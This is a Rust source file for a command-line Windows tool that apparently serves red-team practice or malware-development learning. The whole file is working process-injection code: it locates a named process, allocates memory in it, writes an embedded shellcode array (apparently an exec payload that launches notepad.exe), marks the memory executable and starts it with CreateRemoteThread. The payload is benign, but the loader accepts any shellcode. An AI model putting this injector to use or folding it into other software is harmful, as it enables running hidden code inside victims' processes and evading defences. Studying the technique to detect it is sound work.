use std::ffi::c_char;
use windows_sys::Win32::{
    Foundation::{CloseHandle, INVALID_HANDLE_VALUE},
    System::{
        Diagnostics::{
            Debug::WriteProcessMemory,
            ToolHelp::{
                CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32,
            },
        },
        LibraryLoader::{GetModuleHandleA, GetProcAddress},
        Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,PAGE_READWRITE,VirtualProtectEx},
        Threading::{CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS, WaitForSingleObject},
    },
};
use clap::Parser;

#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    /// Process to inject
    #[arg(short, long)]
    process: String,
}

pub const INFINITE: u32 = 4294967295u32;

fn warn<T: AsRef<str> + std::fmt::Display>(warning: T) {
    eprintln!("[!] {}\n", warning);
}

fn info<T: AsRef<str> + std::fmt::Display>(data: T) {
    println!("[+] {}\n", data);
}

fn enumerate_process(sz_process_name: &str, pid: &mut u32) {
    let mut proc : PROCESSENTRY32 = unsafe { std::mem::zeroed() };
    proc.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;

    info("Creating the snapshot handle...");

    let mut snapshot = unsafe { CreateToolhelp32Snapshot(0x00000002, 0) };
    match snapshot {
        INVALID_HANDLE_VALUE => warn("Couldn't create the snapshot!"),
        _ => ()
    }

    info("Succesfully created the handle! Executing Process32First...");

    unsafe { match Process32First(snapshot, &mut proc) {
        0 => warn(format!("Process32First failed with error {}", std::io::Error::last_os_error())),
        _ => (),
    } }

    info("Succesfully executed Process32First! Looping through the processes...");

    while unsafe { Process32Next(snapshot, &mut proc) } != 0 {
        let sz_exe_file = unsafe { std::ffi::CStr::from_ptr(proc.szExeFile.as_ptr() as *const c_char) };
        let sz_exe_file = sz_exe_file.to_owned().to_str().unwrap().to_lowercase();
        if sz_exe_file == sz_process_name {
            *pid = proc.th32ProcessID;
            break;
        }
    }

    match pid {
        0 => {
            warn("Couldn't get the PID!");
            std::process::exit(0x000100);
        },
        _ => (),
    }

    info("Closing the snapshot handle...");

    unsafe { CloseHandle(snapshot) };
}

fn shellcode_inject(pid: &u32, shellcode: &[u8]) {
    let process = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, *pid) };

    let p_shellcode_address = unsafe { VirtualAllocEx(process, std::ptr::null_mut(), shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) };

    if p_shellcode_address.is_null() {
        warn("Couldn't allocate the memory to the process!");
        std::process::exit(0x000100);
    }

    match unsafe { WriteProcessMemory(process, p_shellcode_address, shellcode.as_ptr() as _,shellcode.len(),std::ptr::null_mut()) } {
        0 => {
            warn(format!("WriteProcessMemory failed with error {:?}", std::io::Error::last_os_error()));
            std::process::exit(0x000100);
        },
        _ => (),
    };

    let mut old_protection = PAGE_READWRITE;

    if unsafe { VirtualProtectEx(process,p_shellcode_address,shellcode.len(),PAGE_EXECUTE_READWRITE,&mut old_protection) == 0 } {
        warn("Couldn't change the memory protection! panicking...");
        panic!();
    }

    let thread = unsafe { CreateRemoteThread(process,std::ptr::null_mut(),0,Some(std::mem::transmute(p_shellcode_address)),std::ptr::null_mut(),0,std::ptr::null_mut())};

    if thread == INVALID_HANDLE_VALUE {
        warn("Couldn't create remote thread!");
        warn(std::io::Error::last_os_error().to_string());
        std::process::exit(0x000100);
    }

    let status = unsafe {  WaitForSingleObject(thread, INFINITE) };
    if status != 0 {
        let error = std::io::Error::last_os_error();
        println!("{}", error.to_string())
    }
}

fn main() {
    let args = Args::parse();

    let process_name = args.process;

    let shellcode : [u8; 279] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,
        0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,
        0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,
        0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,
        0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,
        0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,
        0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,
        0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,
        0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
        0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,
        0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,
        0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,
        0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,
        0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,
        0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,
        0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,
        0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,
        0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,
        0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,
        0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,
        0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,
        0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x6e,0x6f,0x74,0x65,
        0x70,0x61,0x64,0x2e,0x65,0x78,0x65,0x00];

    let mut pid : u32 = 0;
    enumerate_process(&process_name, &mut pid);
    shellcode_inject(&pid, &shellcode);

    info(format!("PID: {:?}", pid));
}
